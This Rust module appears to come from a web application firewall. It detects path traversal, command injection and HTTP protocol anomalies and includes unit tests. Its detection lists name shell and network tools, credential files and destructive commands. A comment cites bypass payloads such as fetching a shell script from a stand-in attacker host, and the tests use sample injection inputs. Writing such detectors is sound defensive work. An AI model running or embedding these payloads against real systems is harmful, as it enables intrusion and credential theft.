//! Additional attack detection: Path Traversal, Command Injection, Protocol Anomalies

use crate::{AttackCategory, MatchLocation, RuleMatch};

/// Detect path traversal attacks
pub fn analyze_path_traversal(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
    let mut results = Vec::new();
    let decoded = input.replace('\\', "/");

    let traversal_patterns = [
        "../", "..\\", "%2e%2e/", "%2e%2e\\",
        "..%2f", "..%5c", "%252e%252e%252f",
        "....//", "..../\\",
    ];
    for p in &traversal_patterns {
        if decoded.to_lowercase().contains(p) {
            results.push(RuleMatch {
                rule_id: 930100,
                category: AttackCategory::PathTraversal,
                score: 5,
                message: format!("Path traversal detected: {}", p),
                location: location.clone(),
                matched_data: truncate(input, 80),
            });
            break;
        }
    }

    // Sensitive file access
    let sensitive = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "/proc/self", "/dev/null", "web.config",
        ".htaccess", ".env", ".git/config",
        "wp-config.php", "/windows/system32",
    ];
    let lower = decoded.to_lowercase();
    for s in &sensitive {
        if lower.contains(s) {
            results.push(RuleMatch {
                rule_id: 930200,
                category: AttackCategory::PathTraversal,
                score: 5,
                message: format!("Sensitive file access attempt: {}", s),
                location: location.clone(),
                matched_data: truncate(input, 80),
            });
            break;
        }
    }

    results
}

/// Detect command injection attacks
pub fn analyze_command_injection(input: &str, location: MatchLocation) -> Vec<RuleMatch> {
    let mut results = Vec::new();
    let lower = input.to_lowercase();

    // Shell metacharacters used for chaining (space-separated forms)
    let space_meta_patterns = [
        "; ", "| ", "|| ", "&& ", "& ", "$(", "`",
        "\n", "\r\n",
    ];
    let has_space_metachar = space_meta_patterns.iter().any(|p| lower.contains(p));

    // Dangerous commands
    let dangerous_cmds = [
        "cat ", "wget ", "curl ", "chmod ", "chown ",
        "/bin/sh", "/bin/bash", "/bin/zsh",
        "nc ", "ncat ", "netcat ", "python ", "perl ",
        "ruby ", "php ", "node ", "powershell",
        "cmd.exe", "whoami", "id ", "uname ",
        "passwd", "shadow", "ifconfig", "ip addr",
        "rm -rf", "dd if=", "mkfifo", "nohup",
        "eval ", "exec ",
    ];

    // Additional: bare metachar directly followed by a dangerous command with no
    // separating space — a common bypass for detectors that only look for "| cmd".
    // e.g. `|whoami`, `&cat /etc/passwd`, `||wget attacker.com/shell.sh`
    let cmd_names: Vec<&str> = dangerous_cmds.iter().map(|c| c.trim()).collect();
    let has_adjacent_metachar_cmd = ["||" , "|", "&&", "&"].iter().any(|meta| {
        let mut pos = 0;
        while pos < lower.len() {
            if let Some(idx) = lower[pos..].find(meta) {
                let abs = pos + idx;
                // Strip any repeated metachar chars (e.g. `|||` → skip extra `|`s)
                let after_meta = lower[abs + meta.len()..].trim_start_matches(|c| c == '|' || c == '&');
                if cmd_names.iter().any(|cmd| after_meta.starts_with(cmd)) {
                    return true;
                }
                pos = abs + 1;
            } else {
                break;
            }
        }
        false
    });

    let has_metachar = has_space_metachar || has_adjacent_metachar_cmd;

    if has_metachar {
        for cmd in &dangerous_cmds {
            if lower.contains(cmd) {
                results.push(RuleMatch {
                    rule_id: 932100,
                    category: AttackCategory::CommandInjection,
                    score: 5,
                    message: format!("Command injection detected: shell meta + '{}'", cmd.trim()),
                    location: location.clone(),
                    matched_data: truncate(input, 80),
                });
                break;
            }
        }
    }

    // Backtick command substitution
    if input.contains('`') && input.matches('`').count() >= 2 {
        results.push(RuleMatch {
            rule_id: 932200,
            category: AttackCategory::CommandInjection,
            score: 4,
            message: "Command injection: backtick command substitution detected".to_string(),
            location: location.clone(),
            matched_data: truncate(input, 80),
        });
    }

    results
}

/// Detect HTTP protocol violations / request anomalies
pub fn analyze_protocol_anomalies(
    method: &str,
    path: &str,
    headers: &[(String, String)],
    body_size: usize,
    location: MatchLocation,
) -> Vec<RuleMatch> {
    let mut results = Vec::new();

    // Invalid HTTP method
    let valid_methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"];
    if !valid_methods.contains(&method.to_uppercase().as_str()) {
        results.push(RuleMatch {
            rule_id: 911100,
            category: AttackCategory::ProtocolViolation,
            score: 3,
            message: format!("Invalid HTTP method: {}", method),
            location: location.clone(),
            matched_data: method.to_string(),
        });
    }

    // TRACE method (used for XST attacks)
    if method.eq_ignore_ascii_case("TRACE") {
        results.push(RuleMatch {
            rule_id: 911200,
            category: AttackCategory::ProtocolViolation,
            score: 5,
            message: "TRACE method detected (Cross-Site Tracing risk)".to_string(),
            location: location.clone(),
            matched_data: method.to_string(),
        });
    }

    // Missing Host header
    let has_host = headers.iter().any(|(k, _)| k.eq_ignore_ascii_case("host"));
    if !has_host {
        results.push(RuleMatch {
            rule_id: 920200,
            category: AttackCategory::ProtocolViolation,
            score: 3,
            message: "Missing Host header".to_string(),
            location: location.clone(),
            matched_data: String::new(),
        });
    }

    // Missing Content-Type for body-bearing methods
    if body_size > 0 && (method.eq_ignore_ascii_case("POST") || method.eq_ignore_ascii_case("PUT")) {
        let has_ct = headers.iter().any(|(k, _)| k.eq_ignore_ascii_case("content-type"));
        if !has_ct {
            results.push(RuleMatch {
                rule_id: 920300,
                category: AttackCategory::ProtocolViolation,
                score: 2,
                message: "Missing Content-Type for body-bearing request".to_string(),
                location: location.clone(),
                matched_data: String::new(),
            });
        }
    }

    // Null byte in URL
    if path.contains('\0') || path.contains("%00") {
        results.push(RuleMatch {
            rule_id: 920400,
            category: AttackCategory::RequestAnomaly,
            score: 5,
            message: "Null byte in URL path".to_string(),
            location: location.clone(),
            matched_data: truncate(path, 80),
        });
    }

    results
}

fn truncate(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        format!("{}...", &s[..max])
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::MatchLocation;

    #[test]
    fn test_path_traversal() {
        let r = analyze_path_traversal("../../etc/passwd", MatchLocation::Path);
        assert!(!r.is_empty());
    }

    #[test]
    fn test_command_injection() {
        let r = analyze_command_injection("; cat /etc/passwd", MatchLocation::Body);
        assert!(r.iter().any(|m| m.rule_id == 932100));
    }

    #[test]
    fn test_clean_path() {
        let r = analyze_path_traversal("/api/v1/users/123", MatchLocation::Path);
        assert!(r.is_empty());
    }

    #[test]
    fn test_trace_method() {
        let r = analyze_protocol_anomalies(
            "TRACE", "/", &[("Host".into(), "example.com".into())], 0, MatchLocation::Path,
        );
        assert!(r.iter().any(|m| m.rule_id == 911200));
    }
}
